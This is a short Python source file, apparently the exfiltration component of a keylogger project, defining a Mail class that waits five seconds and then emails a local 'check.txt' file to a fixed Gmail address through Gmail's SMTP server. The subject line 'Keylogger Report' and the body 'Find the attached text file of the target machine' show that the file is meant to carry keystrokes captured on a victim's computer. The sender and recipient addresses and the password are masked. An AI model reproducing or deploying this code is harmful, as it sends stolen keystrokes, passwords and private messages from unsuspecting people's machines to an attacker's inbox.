# Python code to illustrate Sending mail with attachments
# from your Gmail account

# libraries to be imported
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


class Mail:

    @staticmethod
    def send_mail():
        time.sleep(5)
        fromaddr = "manuxxxxxxx.xxx@gmail.com"
        toaddr = "npawanxxxxxx@gmail.com"

        # instance of MIMEMultipart
        msg = MIMEMultipart()

        # storing the senders email address
        msg['From'] = fromaddr

        # storing the receivers email address
        msg['To'] = toaddr

        # storing the subject
        msg['Subject'] = "Keylogger Report"

        # string to store the body of the mail
        body = "Find the attached text file of the target machine"

        # attach the body with the msg instance
        msg.attach(MIMEText(body, 'plain'))

        # open the file to be sent
        filename = "check.txt"
        attachment = open("C:\\Users\\Admin\\PycharmProjects\\pgdis\\check.txt", "rb")

        # instance of MIMEBase and named as p
        p = MIMEBase('application', 'octet-stream')

        # To change the payload into encoded form
        p.set_payload((attachment).read())

        # encode into base64
        encoders.encode_base64(p)

        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

        # attach the instance 'p' to instance 'msg'
        msg.attach(p)

        # creates SMTP session
        s = smtplib.SMTP('smtp.gmail.com', 587)

        # start TLS for security
        s.starttls()

        # Authentication
        s.login(fromaddr, "**AppPassword**")

        # Converts the Multipart msg into a string
        text = msg.as_string()

        # sending the mail
        s.sendmail(fromaddr, toaddr, text)

        # terminating the session
        print("Mail Sent")
        s.quit()
